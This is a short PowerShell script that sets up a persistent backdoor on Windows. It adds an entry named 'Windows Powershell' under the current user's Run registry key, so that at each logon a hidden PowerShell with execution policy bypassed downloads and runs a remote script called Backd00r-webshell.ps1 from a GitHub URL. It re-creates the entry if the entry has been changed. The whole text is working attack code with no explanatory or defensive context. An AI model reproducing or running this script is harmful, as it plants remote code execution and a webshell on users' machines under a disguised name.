$autorunKeyName = "Windows Powershell"
$autorunKeyVal = "powershell.exe -nop -windowstyle hidden -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cgke/script/master/Backd00r-webshell.ps1');Backd00r-webshell.ps1"""
$autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
if (-not $autoruns.$autorunKeyName) {
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}
elseif($autoruns.$autorunKeyName -ne $autorunKeyVal) {
    Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}
